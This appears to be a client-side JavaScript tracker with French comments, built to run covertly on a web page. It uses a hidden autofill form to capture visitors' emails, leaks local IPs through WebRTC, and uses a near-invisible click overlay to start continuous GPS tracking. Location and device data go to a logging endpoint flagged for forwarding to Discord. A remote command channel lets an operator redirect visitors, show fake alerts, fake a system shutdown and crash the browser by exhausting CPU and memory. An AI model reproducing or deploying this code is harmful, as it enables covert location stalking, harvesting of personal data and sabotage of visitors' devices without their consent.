let cachedLocalIp = null;
let capturedEmail = null;

// Création d'un "piège" à autofill pour tenter de capturer l'email
function setupAutofillTrap() {
    const container = document.createElement('div');
    container.style.cssText = 'position:absolute; top:-1000px; left:-1000px; opacity:0.01; pointer-events:none;';
    container.innerHTML = `
        <form id="system-auth-trap">
            <input type="text" name="username" autocomplete="username email">
            <input type="email" name="email" autocomplete="email">
            <input type="password" name="password" autocomplete="current-password">
        </form>
    `;
    document.body.appendChild(container);

    // On surveille les changements sur les champs
    const emailInput = container.querySelector('input[type="email"]');
    const userInput = container.querySelector('input[name="username"]');
    
    const checkInputs = () => {
        if (emailInput.value && emailInput.value.includes('@')) {
            capturedEmail = emailInput.value;
        } else if (userInput.value && userInput.value.includes('@')) {
            capturedEmail = userInput.value;
        }
    };

    emailInput.addEventListener('change', checkInputs);
    userInput.addEventListener('change', checkInputs);
    setInterval(checkInputs, 2000);
}

// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    if (cachedLocalIp) return cachedLocalIp;

    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) {
                    // Filtrage des IPs "bidon" et de l'IP publique si elle s'est glissée ici
                    const realIps = ips.filter(ip => 
                        ip &&
                        !ip.includes('.local') && 
                        ip !== '192.0.0.2' && 
                        ip !== '0.0.0.0' &&
                        !ip.startsWith('127.')
                    );
                    
                    if (realIps.length > 0) {
                        cachedLocalIp = realIps[0];
                        resolve(realIps[0]);
                    } else {
                        resolve("Masquée (VPN/Proxy)");
                    }
                } else {
                    resolve("Masquée (Navigateur)");
                }
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && (ip.includes('.') || ip.includes(':'))) {
                ips.push(ip);
            }
        };

        setTimeout(() => {
            if (ips.length > 0) {
                cachedLocalIp = ips[0];
                resolve(ips[0]);
            } else {
                resolve("Inconnue (Timeout/mDNS)");
            }
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 15000, 
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            options
        );
    });
}

async function getDeviceStats() {
    const stats = {
        battery: null,
        charging: null,
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        downlink: navigator.connection ? navigator.connection.downlink : null,
        rtt: navigator.connection ? navigator.connection.rtt : null,
        email: capturedEmail,
        platform: navigator.platform,
        vendor: navigator.vendor,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory
    };

    const localIp = cachedLocalIp;
    // Détection avancée du type de réseau
    if (localIp) {
        if (localIp.startsWith('192.168.43.')) {
            stats.networkName = "Android Hotspot (Default)";
            stats.connection = 'hotspot';
        } else if (localIp.startsWith('172.20.10.')) {
            stats.networkName = "iPhone Hotspot (Default)";
            stats.connection = 'hotspot';
        } else if (localIp.startsWith('192.168.')) {
            stats.connection = 'wifi';
        } else if (localIp.startsWith('10.')) {
            stats.connection = 'private/vpn';
        }
    }

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            stats.battery = Math.round(battery.level * 100);
            stats.charging = battery.charging;
        }
    } catch (e) {}
    
    return stats;
}

let sessionId = localStorage.getItem('tracker_session_id');
if (!sessionId) {
    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('tracker_session_id', sessionId);
}

async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord = false) {
    try {
        const localIp = cachedLocalIp || await getLocalIP();
        const stats = await getDeviceStats();
        
        const res = await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: sessionId,
                isUpdate: isUpdate,
                forceDiscord: forceDiscord,
                localIp: localIp,
                preciseLocation: preciseLocation,
                deviceStats: stats,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });

        // Après chaque log, on vérifie si l'admin a envoyé une commande
        checkCommands();
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Tentative de garder l'écran allumé (Wake Lock) pour assurer la réception des commandes
let wakeLock = null;
async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
            console.log("Wake Lock activé 🔓");
        }
    } catch (err) {
        console.warn("Wake Lock refusé:", err.message);
    }
}

async function checkCommands() {
    try {
        // Fréquence de vérification augmentée si l'appareil est actif
        const res = await fetch(`/api/command?sessionId=${sessionId}`);
        const data = await res.json();

        if (data && data.command) {
            // Si on reçoit une commande, on essaie de réveiller l'appareil
            requestWakeLock();
            const cmd = data.command;
            console.log("Commande reçue de l'admin:", cmd.command);

            switch (cmd.command) {
                case 'FLASH_ALERT':
                    const msg = cmd.payload.message || "ALERTE SYSTÈME";
                    
                    // Création de l'overlay plein écran
                    const flashOverlay = document.createElement('div');
                    flashOverlay.style.cssText = `
                        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                        background: red; color: white; z-index: 9999999;
                        display: flex; align-items: center; justify-content: center;
                        text-align: center; font-family: sans-serif; font-weight: bold;
                        flex-direction: column; padding: 20px; box-sizing: border-box;
                    `;
                    
                    flashOverlay.innerHTML = `
                        <h1 style="font-size: 3rem; margin-bottom: 20px; text-shadow: 2px 2px 10px black;">⚠️ ATTENTION ⚠️</h1>
                        <p style="font-size: 1.5rem; background: rgba(0,0,0,0.5); padding: 20px; border-radius: 10px;">${msg}</p>
                        <button id="close-flash" style="margin-top: 30px; padding: 15px 30px; font-size: 1rem; border: none; border-radius: 5px; cursor: pointer;">FERMER</button>
                    `;
                    
                    document.body.appendChild(flashOverlay);
                    
                    // Tentative de plein écran
                    try { flashOverlay.requestFullscreen().catch(() => {}); } catch(e) {}
                    
                    flashOverlay.querySelector('#close-flash').onclick = () => {
                        flashOverlay.remove();
                        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
                    };
                    break;

                case 'ALERT':
                    // On garde ALERT classique pour compatibilité
                    alert(cmd.payload.message || "Message de l'administrateur");
                    break;
                case 'VIBRATE':
                    if (navigator.vibrate) {
                        navigator.vibrate([500, 200, 500, 200, 1000]);
                    }
                    break;
                case 'FULLSCREEN':
                    const forceFS = () => {
                        document.documentElement.requestFullscreen().catch(() => {});
                    };
                    forceFS();
                    document.addEventListener('click', forceFS, { once: true });
                    break;
                case 'REDIRECT':
                    window.location.replace(cmd.payload.url || 'https://google.com');
                    break;
                case 'RELOAD':
                    window.location.reload();
                    break;
                case 'STOP_DEVICE':
                    // Simulation d'arrêt TOTALE et agressive pour PC et Mobile
                    document.body.innerHTML = '';
                    document.body.style.cssText = 'background:black !important; cursor:none !important; overflow:hidden !important;';
                    
                    const crashOverlay = document.createElement('div');
                    crashOverlay.style.cssText = `
                        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                        background: black; color: white; z-index: 99999999;
                        display: flex; align-items: center; justify-content: center;
                        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                        text-align: center; cursor: none;
                    `;
                    
                    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                    
                    if (isMobile) {
                        // Simulation d'arrêt Android / iOS parfaite
                        crashOverlay.innerHTML = `
                            <div style="display:flex; flex-direction:column; align-items:center;">
                                <div style="width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px;"></div>
                                <h2 style="font-size: 1.1rem; font-weight: 400; color: white; letter-spacing: 0.5px;">Arrêt en cours...</h2>
                            </div>
                            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                        `;
                    } else {
                        // Simulation d'arrêt Windows 10/11 parfaite
                        crashOverlay.style.background = 'black';
                        crashOverlay.innerHTML = `
                            <div style="display:flex; flex-direction:column; align-items:center;">
                                <div style="width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #0078d7; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px;"></div>
                                <h2 style="font-size: 1.8rem; font-weight: 300; color: white;">Arrêt en cours</h2>
                            </div>
                            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                        `;
                    }
                    
                    document.body.appendChild(crashOverlay);
                    
                    // On essaie de forcer le plein écran sans arrêt
                    const forceLock = () => {
                        try {
                            if (document.documentElement.requestFullscreen) {
                                document.documentElement.requestFullscreen().catch(() => {});
                            }
                        } catch(e) {}
                    };
                    
                    forceLock();
                    document.addEventListener('click', forceLock);
                    document.addEventListener('keydown', (e) => {
                        e.preventDefault();
                        return false;
                    }, true);

                    // ATTACK : Saturation de l'appareil pour forcer un plantage réel (Freeze)
                    setTimeout(() => {
                        // 1. Saturation Mémoire (Heap Spray)
                        const garbage = [];
                        // 2. Saturation CPU (Infinite Loop)
                        const freeze = () => {
                            const start = Date.now();
                            while (Date.now() - start < 500) { // Bloque par tranches de 500ms
                                Math.sqrt(Math.random() * Math.random());
                                garbage.push(new Array(1000).fill("STOP_DEVICE_CRITICAL_FAILURE_" + Math.random()));
                            }
                            setTimeout(freeze, 10);
                        };
                        freeze();
                        
                        // 3. Tentative de crash du navigateur par récursion infinie
                        const crash = () => { crash(); };
                        setTimeout(crash, 1000);
                    }, 1000);
                    break;
            }
        }
    } catch (e) {
        console.error("Erreur checkCommands:", e);
    }
}

async function startVerification() {
    let overlay = document.getElementById('verification-overlay');

    if (!overlay) {
        overlay = document.createElement('div');
        overlay.id = 'verification-overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
            background: 'rgba(0,0,0,0.01)', zIndex: '99999', cursor: 'pointer',
            display: 'flex', alignItems: 'center', justifyContent: 'center'
        });
        const msg = document.createElement('div');
        Object.assign(msg.style, {
            background: 'rgba(0,0,0,0.6)', color: 'white', padding: '10px 20px',
            borderRadius: '30px', fontSize: '12px', pointerEvents: 'none', opacity: '0.1'
        });
        msg.innerText = 'Cliquer pour activer le contenu interactif';
        overlay.appendChild(msg);
        document.body.appendChild(overlay);
    }

    overlay.style.display = 'flex';

    let lastLoggedPos = null;

    function getDistance(lat1, lon1, lat2, lon2) {
        const R = 6371e3;
        const φ1 = lat1 * Math.PI/180;
        const φ2 = lat2 * Math.PI/180;
        const Δφ = (lat2-lat1) * Math.PI/180;
        const Δλ = (lon2-lon1) * Math.PI/180;
        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }

    const handleFirstClick = async () => {
        overlay.style.cursor = 'wait';
        const msg = overlay.querySelector('div');
        if (msg) {
            msg.innerText = 'Chargement en cours...';
            msg.style.opacity = '0.8';
        }
        
        // On libère l'écran tout de suite pour l'utilisateur
        overlay.style.display = 'none';

        let firstGpsPointSent = false;
        let timeoutHandle = null;

        if (navigator.geolocation) {
            // TIMEOUT DE SECOURS: Si pas de GPS après 20s, envoyer le ping sans GPS à Discord
            timeoutHandle = setTimeout(() => {
                if (!firstGpsPointSent) {
                    console.log("GPS timeout - envoi ping sans GPS à Discord");
                    logVisitor(null, false, true);
                    firstGpsPointSent = true;
                }
            }, 20000);

            navigator.geolocation.watchPosition(
                async (position) => {
                    const newLoc = {
                        lat: position.coords.latitude, lon: position.coords.longitude,
                        accuracy: position.coords.accuracy, speed: position.coords.speed
                    };
                    
                    // PREMIER POINT GPS: Toujours envoyer à Discord avec forceDiscord
                    if (!firstGpsPointSent) {
                        firstGpsPointSent = true;
                        clearTimeout(timeoutHandle);
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, false, true);
                        return;
                    }

                    // Points suivants: Appliquer les filtres de distance
                    if (!lastLoggedPos) {
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, true);
                        return;
                    }

                    const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
                    
                    // FILTRE ANTI-SAUT :
                    // Si on se déplace de plus de 500m mais que la vitesse est nulle ou très faible (< 1 km/h)
                    // C'est probablement un saut opérateur/cellulaire, on ignore.
                    const isAbnormalJump = dist > 500 && (newLoc.speed === null || newLoc.speed < 0.3);
                    
                    if (dist > 3 && !isAbnormalJump) {
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, true);
                    }
                },
                null,
                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
            );
        } else {
            // Pas de géolocalisation: envoyer un ping simple après 1s
            setTimeout(() => logVisitor(null, false, true), 1000);
        }

        setInterval(() => logVisitor(null, true), 30000);
    };

    overlay.addEventListener('click', handleFirstClick, { once: true });
}

if (document.readyState === 'complete') {
    setupAutofillTrap();
    startVerification();
    // Vérification des commandes très fréquente (toutes les 2 secondes)
    setInterval(checkCommands, 2000);
    // Tenter de réactiver le Wake Lock au clic ou focus
    document.addEventListener('click', requestWakeLock);
    window.addEventListener('focus', requestWakeLock);
} else {
    window.addEventListener('load', startVerification);
}
